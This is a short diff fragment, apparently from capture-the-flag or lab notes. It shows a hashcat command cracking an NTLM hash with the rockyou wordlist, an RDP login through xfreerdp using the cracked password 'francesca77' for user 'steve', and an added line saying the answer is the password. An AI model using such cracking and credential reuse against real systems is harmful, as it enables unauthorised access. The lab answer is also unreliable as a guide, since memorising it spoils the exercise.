@@ -26,3 +26,4 @@ hashcat -m 1000 steve.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashca
 ...
 xfreerdp /u:steve /p:francesca77 /v:192.168.190.227 /drive:smbfolder,/home/kali/Desktop
 
+# Answer is the password
